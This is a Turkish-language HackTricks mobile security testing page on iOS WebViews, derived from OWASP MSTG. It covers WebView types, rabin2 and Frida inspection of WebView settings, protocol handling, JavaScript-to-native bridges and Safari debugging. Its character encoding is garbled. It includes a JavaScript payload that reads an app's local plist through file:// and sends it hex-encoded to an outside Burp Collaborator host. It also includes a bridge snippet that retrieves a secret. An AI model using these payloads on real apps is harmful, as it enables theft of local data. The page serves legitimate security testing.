# iOS WebViews

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

Bu sayfanÄ±n kodu [buradan](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md) Ã§Ä±karÄ±lmÄ±ÅŸtÄ±r. Daha fazla detay iÃ§in sayfayÄ± kontrol edin.


## WebView tÃ¼rleri

WebView'lar, uygulamalar iÃ§inde etkileÅŸimli web iÃ§eriÄŸi gÃ¶rÃ¼ntÃ¼lemek iÃ§in kullanÄ±lÄ±r. FarklÄ± WebView tÃ¼rleri, iOS uygulamalarÄ± iÃ§in farklÄ± iÅŸlevsellikler ve gÃ¼venlik Ã¶zellikleri sunar. Ä°ÅŸte kÄ±sa bir genel bakÄ±ÅŸ:

- **UIWebView**, **JavaScript**'i devre dÄ±ÅŸÄ± bÄ±rakma desteÄŸi olmadÄ±ÄŸÄ± iÃ§in iOS 12'den itibaren artÄ±k Ã¶nerilmemektedir; bu da onu script injection ve **Cross-Site Scripting (XSS)** saldÄ±rÄ±larÄ±na karÅŸÄ± savunmasÄ±z hale getirir.

- **WKWebView**, uygulamalara web iÃ§eriÄŸi eklemek iÃ§in tercih edilen seÃ§enektir ve iÃ§erik Ã¼zerinde geliÅŸtirilmiÅŸ kontrol ve gÃ¼venlik Ã¶zellikleri sunar. **JavaScript** varsayÄ±lan olarak etkindir, ancak gerekirse devre dÄ±ÅŸÄ± bÄ±rakÄ±labilir. AyrÄ±ca, **JavaScript**'in otomatik olarak pencere aÃ§masÄ±nÄ± Ã¶nlemek iÃ§in Ã¶zellikler destekler ve tÃ¼m iÃ§eriÄŸin gÃ¼venli bir ÅŸekilde yÃ¼klenmesini saÄŸlar. AyrÄ±ca, **WKWebView**'in mimarisi, bellek bozulmasÄ± riskini ana uygulama sÃ¼recini etkilemeyecek ÅŸekilde en aza indirir.

- **SFSafariViewController**, uygulamalar iÃ§inde standart bir web tarayÄ±cÄ± deneyimi sunar; okunabilir bir adres alanÄ±, paylaÅŸÄ±m ve navigasyon dÃ¼ÄŸmeleri ile Safari'de iÃ§erik aÃ§mak iÃ§in doÄŸrudan bir baÄŸlantÄ± iÃ§eren belirli bir dÃ¼zen ile tanÄ±nÄ±r. **WKWebView**'in aksine, **SFSafariViewController**'da **JavaScript** devre dÄ±ÅŸÄ± bÄ±rakÄ±lamaz; ayrÄ±ca Ã§erezleri ve verileri Safari ile paylaÅŸÄ±r, bu da kullanÄ±cÄ± gizliliÄŸini uygulamadan korur. App Store yÃ¶nergelerine gÃ¶re belirgin bir ÅŸekilde gÃ¶rÃ¼ntÃ¼lenmelidir.
```javascript
// Example of disabling JavaScript in WKWebView:
WKPreferences *preferences = [[WKPreferences alloc] init];
preferences.javaScriptEnabled = NO;
WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
config.preferences = preferences;
WKWebView *webView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:config];
```
## WebViews KonfigÃ¼rasyon KeÅŸfi Ã–zeti

### **Statik Analiz Genel GÃ¶rÃ¼nÃ¼mÃ¼**

**WebViews** konfigÃ¼rasyonlarÄ±nÄ± incelerken, iki ana tÃ¼r Ã¼zerinde durulmaktadÄ±r: **UIWebView** ve **WKWebView**. Bu WebView'larÄ± bir ikili dosya iÃ§inde tanÄ±mlamak iÃ§in, belirli sÄ±nÄ±f referanslarÄ± ve baÅŸlatma yÃ¶ntemlerini arayan komutlar kullanÄ±lmaktadÄ±r.

- **UIWebView TanÄ±mlamasÄ±**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
```
Bu komut, ikili dosyada buna iliÅŸkin metin dizelerini arayarak **UIWebView** Ã¶rneklerini bulmaya yardÄ±mcÄ± olur.

- **WKWebView TanÄ±mlama**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
```
Benzer ÅŸekilde, **WKWebView** iÃ§in bu komut, kullanÄ±mÄ±nÄ± gÃ¶steren metin dizelerini bulmak iÃ§in ikili dosyayÄ± arar.

AyrÄ±ca, bir **WKWebView**'in nasÄ±l baÅŸlatÄ±ldÄ±ÄŸÄ±nÄ± bulmak iÃ§in, baÅŸlatma ile ilgili yÃ¶ntem imzasÄ±nÄ± hedef alan aÅŸaÄŸÄ±daki komut Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r:
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
```
#### **JavaScript YapÄ±landÄ±rma DoÄŸrulamasÄ±**

**WKWebView** iÃ§in, JavaScript'in devre dÄ±ÅŸÄ± bÄ±rakÄ±lmasÄ±nÄ±n gerekli olmadÄ±kÃ§a en iyi uygulama olduÄŸu vurgulanmaktadÄ±r. DerlenmiÅŸ ikili dosya, `javaScriptEnabled` Ã¶zelliÄŸinin `false` olarak ayarlandÄ±ÄŸÄ±nÄ± doÄŸrulamak iÃ§in aranÄ±r, bÃ¶ylece JavaScript'in devre dÄ±ÅŸÄ± olduÄŸu garanti edilir:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
```
#### **Sadece GÃ¼venli Ä°Ã§erik DoÄŸrulamasÄ±**

**WKWebView**, **UIWebView** ile karÅŸÄ±laÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda karÄ±ÅŸÄ±k iÃ§erik sorunlarÄ±nÄ± tanÄ±mlama yeteneÄŸi sunar. Bu, tÃ¼m sayfa kaynaklarÄ±nÄ±n gÃ¼venli baÄŸlantÄ±lar Ã¼zerinden yÃ¼klendiÄŸinden emin olmak iÃ§in `hasOnlySecureContent` Ã¶zelliÄŸi kullanÄ±larak kontrol edilir. DerlenmiÅŸ ikide arama ÅŸu ÅŸekilde gerÃ§ekleÅŸtirilir:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
### **Dinamik Analiz Ä°Ã§gÃ¶rÃ¼leri**

Dinamik analiz, WebView Ã¶rneklerini ve Ã¶zelliklerini incelemeyi iÃ§erir. Bu amaÃ§la `webviews_inspector.js` adlÄ± bir script kullanÄ±lÄ±r ve `UIWebView`, `WKWebView` ve `SFSafariViewController` Ã¶rneklerini hedef alÄ±r. Bulunan Ã¶rnekler hakkÄ±nda, URL'ler ve JavaScript ile gÃ¼venli iÃ§erikle ilgili ayarlar dahil olmak Ã¼zere bilgi kaydeder.

YÄ±ÄŸÄ±n incelemesi, WebView Ã¶rneklerini tanÄ±mlamak ve `javaScriptEnabled` ve `hasonlysecurecontent` Ã¶zelliklerini kontrol etmek iÃ§in `ObjC.choose()` kullanÄ±larak gerÃ§ekleÅŸtirilebilir.

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
{% endcode %}

Script ÅŸu ÅŸekilde Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r:
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js
```
**Ana SonuÃ§lar**:
- WebView Ã¶rnekleri baÅŸarÄ±yla bulunmuÅŸ ve incelenmiÅŸtir.
- JavaScript etkinleÅŸtirme ve gÃ¼venli iÃ§erik ayarlarÄ± doÄŸrulanmÄ±ÅŸtÄ±r.

Bu Ã¶zet, JavaScript etkinleÅŸtirme ve karÄ±ÅŸÄ±k iÃ§erik tespiti gibi gÃ¼venlik Ã¶zelliklerine odaklanarak, WebView yapÄ±landÄ±rmalarÄ±nÄ± statik ve dinamik yaklaÅŸÄ±mlarla analiz etme sÃ¼recindeki kritik adÄ±mlarÄ± ve komutlarÄ± kapsar.

## WebView Protokol YÃ¶netimi

WebView'lerde iÃ§erik yÃ¶netimi, Ã¶zellikle `http(s)://`, `file://` ve `tel://` gibi Ã§eÅŸitli protokollerle Ã§alÄ±ÅŸÄ±rken kritik bir unsurdur. Bu protokoller, uygulamalar iÃ§inde hem uzaktan hem de yerel iÃ§eriÄŸin yÃ¼klenmesini saÄŸlar. Yerel iÃ§erik yÃ¼klenirken, kullanÄ±cÄ±larÄ±n dosya adÄ±nÄ± veya yolunu etkilemesini ve iÃ§eriÄŸi dÃ¼zenlemesini Ã¶nlemek iÃ§in Ã¶nlemler alÄ±nmasÄ± gerektiÄŸi vurgulanmaktadÄ±r.

**WebView'ler**, iÃ§erik yÃ¼klemek iÃ§in farklÄ± yÃ¶ntemler sunar. ArtÄ±k kullanÄ±lmayan **UIWebView** iÃ§in `loadHTMLString:baseURL:` ve `loadData:MIMEType:textEncodingName:baseURL:` gibi yÃ¶ntemler kullanÄ±lÄ±r. DiÄŸer yandan, **WKWebView**, web iÃ§eriÄŸi iÃ§in `loadHTMLString:baseURL:`, `loadData:MIMEType:textEncodingName:baseURL:` ve `loadRequest:` yÃ¶ntemlerini kullanÄ±r. Yerel dosyalarÄ± yÃ¼klemek iÃ§in genellikle `pathForResource:ofType:`, `URLForResource:withExtension:` ve `init(contentsOf:encoding:)` gibi yÃ¶ntemler kullanÄ±lÄ±r. `loadFileURL:allowingReadAccessToURL:` yÃ¶ntemi, belirli bir URL veya dizini WebView'e yÃ¼kleme yeteneÄŸi ile Ã¶zellikle dikkat Ã§ekicidir; eÄŸer bir dizin belirtilirse hassas verileri aÃ§Ä±ÄŸa Ã§Ä±karabilir.

Bu yÃ¶ntemleri kaynak kodunda veya derlenmiÅŸ ikili dosyada bulmak iÃ§in aÅŸaÄŸÄ±daki gibi komutlar kullanÄ±labilir:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
**Dosya eriÅŸimi** ile ilgili olarak, UIWebView evrensel olarak izin verirken, WKWebView dosya URL'lerinden eriÅŸimi yÃ¶netmek iÃ§in `allowFileAccessFromFileURLs` ve `allowUniversalAccessFromFileURLs` ayarlarÄ±nÄ± tanÄ±tÄ±r; her ikisi de varsayÄ±lan olarak false'dur.

GÃ¼venlik ayarlarÄ± iÃ§in **WKWebView** yapÄ±landÄ±rmalarÄ±nÄ± incelemek Ã¼zere bir Frida script Ã¶rneÄŸi saÄŸlanmÄ±ÅŸtÄ±r:
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```
Son olarak, yerel dosyalarÄ± dÄ±ÅŸa aktarmayÄ± amaÃ§layan bir JavaScript yÃ¼kÃ¼, yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ WebView'larla iliÅŸkili potansiyel gÃ¼venlik riskini gÃ¶stermektedir. Bu yÃ¼k, dosya iÃ§eriklerini sunucuya iletmeden Ã¶nce hex formatÄ±na kodlar, WebView uygulamalarÄ±nda sÄ±kÄ± gÃ¼venlik Ã¶nlemlerinin Ã¶nemini vurgular.
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## WebView'ler Ãœzerinden AÃ§Ä±k Native YÃ¶ntemler

## iOS'ta WebView Native ArayÃ¼zlerini Anlamak

iOS 7'den itibaren, Apple **WebView'deki JavaScript ile native** Swift veya Objective-C nesneleri arasÄ±nda iletiÅŸim iÃ§in API'ler saÄŸladÄ±. Bu entegrasyon esasen iki yÃ¶ntemle saÄŸlanmaktadÄ±r:

- **JSContext**: Bir Swift veya Objective-C bloÄŸu, bir `JSContext` iÃ§indeki bir tanÄ±mlayÄ±cÄ±ya baÄŸlandÄ±ÄŸÄ±nda otomatik olarak bir JavaScript fonksiyonu oluÅŸturulur. Bu, JavaScript ve native kod arasÄ±nda sorunsuz bir entegrasyon ve iletiÅŸim saÄŸlar.
- **JSExport ProtokolÃ¼**: `JSExport` protokolÃ¼nÃ¼ miras alarak, native Ã¶zellikler, Ã¶rnek yÃ¶ntemler ve sÄ±nÄ±f yÃ¶ntemleri JavaScript'e aÃ§Ä±labilir. Bu, JavaScript ortamÄ±nda yapÄ±lan herhangi bir deÄŸiÅŸikliÄŸin native ortamda yansÄ±tÄ±ldÄ±ÄŸÄ± ve tersinin de geÃ§erli olduÄŸu anlamÄ±na gelir. Ancak, bu yÃ¶ntemle hassas verilerin istemeden aÃ§Ä±ÄŸa Ã§Ä±kmadÄ±ÄŸÄ±ndan emin olmak Ã¶nemlidir.

### Objective-C'de `JSContext`'e EriÅŸim

Objective-C'de, bir `UIWebView` iÃ§in `JSContext` aÅŸaÄŸÄ±daki kod satÄ±rÄ± ile alÄ±nabilir:
```objc
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
### Communication with `WKWebView`

`WKWebView` iÃ§in, `JSContext`'e doÄŸrudan eriÅŸim mevcut deÄŸildir. Bunun yerine, JavaScript ile yerel iletiÅŸim saÄŸlamak iÃ§in `postMessage` fonksiyonu aracÄ±lÄ±ÄŸÄ±yla mesaj iletimi kullanÄ±lÄ±r. Bu mesajlar iÃ§in iÅŸleyiciler aÅŸaÄŸÄ±daki gibi ayarlanÄ±r, bÃ¶ylece JavaScript yerel uygulama ile gÃ¼venli bir ÅŸekilde etkileÅŸimde bulunabilir:
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### EtkileÅŸim ve Test

JavaScript, bir script mesaj iÅŸleyici tanÄ±mlayarak yerel katmanla etkileÅŸimde bulunabilir. Bu, bir web sayfasÄ±ndan yerel iÅŸlevleri Ã§aÄŸÄ±rmak gibi iÅŸlemlere olanak tanÄ±r:
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}

// Alternative method for calling exposed JavaScript functions
document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
Yerel bir fonksiyon Ã§aÄŸrÄ±sÄ±nÄ±n sonucunu yakalamak ve manipÃ¼le etmek iÃ§in, HTML iÃ§indeki geri Ã§aÄŸÄ±rma fonksiyonu geÃ§ersiz kÄ±lÄ±nabilir:
```html
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
Yerel taraf, `JavaScriptBridgeMessageHandler` sÄ±nÄ±fÄ±nda gÃ¶sterildiÄŸi gibi JavaScript Ã§aÄŸrÄ±sÄ±nÄ± iÅŸler; burada sayÄ±larÄ±n Ã§arpÄ±lmasÄ± gibi iÅŸlemlerin sonuÃ§larÄ± iÅŸlenir ve gÃ¶rÃ¼ntÃ¼leme veya daha fazla manipÃ¼lasyon iÃ§in JavaScript'e geri gÃ¶nderilir:
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {
// Handling "multiplyNumbers" operation
case "multiplyNumbers":
let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
// Callback to JavaScript
let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
}
```
## iOS WebView'lerini Hata AyÄ±klama

(Tutorial based on the one from [https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews))

iOS webview'leri iÃ§indeki web iÃ§eriÄŸini etkili bir ÅŸekilde hata ayÄ±klamak iÃ§in, `console.log()`'a gÃ¶nderilen mesajlarÄ±n Xcode gÃ¼nlÃ¼klerinde gÃ¶rÃ¼ntÃ¼lenmemesi nedeniyle Safari'nin geliÅŸtirici araÃ§larÄ±nÄ± iÃ§eren Ã¶zel bir kurulum gereklidir. Ä°ÅŸte ana adÄ±mlarÄ± ve gereksinimleri vurgulayan basitleÅŸtirilmiÅŸ bir kÄ±lavuz:

- **iOS CihazÄ±nda HazÄ±rlÄ±k**: Safari Web Inspector, iOS cihazÄ±nÄ±zda etkinleÅŸtirilmelidir. Bu, **Ayarlar > Safari > GeliÅŸmiÅŸ** bÃ¶lÃ¼mÃ¼ne giderek ve _Web Inspector_ seÃ§eneÄŸini etkinleÅŸtirerek yapÄ±lÄ±r.

- **macOS CihazÄ±nda HazÄ±rlÄ±k**: macOS geliÅŸtirme makinenizde, Safari iÃ§inde geliÅŸtirici araÃ§larÄ±nÄ± etkinleÅŸtirmeniz gerekir. Safari'yi baÅŸlatÄ±n, **Safari > Tercihler > GeliÅŸmiÅŸ** bÃ¶lÃ¼mÃ¼ne eriÅŸin ve _GeliÅŸtir menÃ¼sÃ¼nÃ¼ GÃ¶ster_ seÃ§eneÄŸini seÃ§in.

- **BaÄŸlantÄ± ve Hata AyÄ±klama**: iOS cihazÄ±nÄ±zÄ± macOS bilgisayarÄ±nÄ±za baÄŸladÄ±ktan ve uygulamanÄ±zÄ± baÅŸlattÄ±ktan sonra, macOS cihazÄ±nÄ±zdaki Safari'yi kullanarak hata ayÄ±klamak istediÄŸiniz webview'i seÃ§in. Safari'nin menÃ¼ Ã§ubuÄŸunda _GeliÅŸtir_ bÃ¶lÃ¼mÃ¼ne gidin, iOS cihazÄ±nÄ±zÄ±n adÄ±nÄ±n Ã¼zerine gelerek webview Ã¶rneklerinin bir listesini gÃ¶rÃ¼n ve incelemek istediÄŸiniz Ã¶rneÄŸi seÃ§in. Bu amaÃ§la yeni bir Safari Web Inspector penceresi aÃ§Ä±lacaktÄ±r.

Ancak, sÄ±nÄ±rlamalarÄ±n farkÄ±nda olun:

- Bu yÃ¶ntemle hata ayÄ±klama, Safari'ye dayandÄ±ÄŸÄ± iÃ§in bir macOS cihazÄ± gerektirir.
- Sadece Xcode aracÄ±lÄ±ÄŸÄ±yla cihazÄ±nÄ±za yÃ¼klenen uygulamalardaki webview'ler hata ayÄ±klama iÃ§in uygundur. App Store veya Apple Configurator aracÄ±lÄ±ÄŸÄ±yla yÃ¼klenen uygulamalardaki webview'ler bu ÅŸekilde hata ayÄ±klanamaz.


## Referanslar

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.**

</details>
{% endhint %}
